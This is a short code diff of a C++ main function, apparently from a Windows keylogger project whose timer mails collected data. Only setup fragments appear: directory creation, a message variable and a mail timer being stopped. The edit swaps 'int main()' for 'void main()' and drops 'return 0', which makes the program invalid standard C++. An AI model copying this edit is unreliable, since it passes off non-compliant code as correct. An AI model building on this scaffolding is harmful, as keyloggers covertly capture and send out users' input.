@@ -10,7 +10,7 @@
 
 using namespace std;
 
-int main(){
+void main(){
     // Settings -> Compiler: Have compiler follow ISO C++ 11 standard and create a WindowsAPI flag
     MSG Msg;
     IO::MKDir(IO::GetOurPath(true));
@@ -23,5 +23,4 @@ int main(){
     }
 
     MailTimer.Stop();
-    return 0;
 }
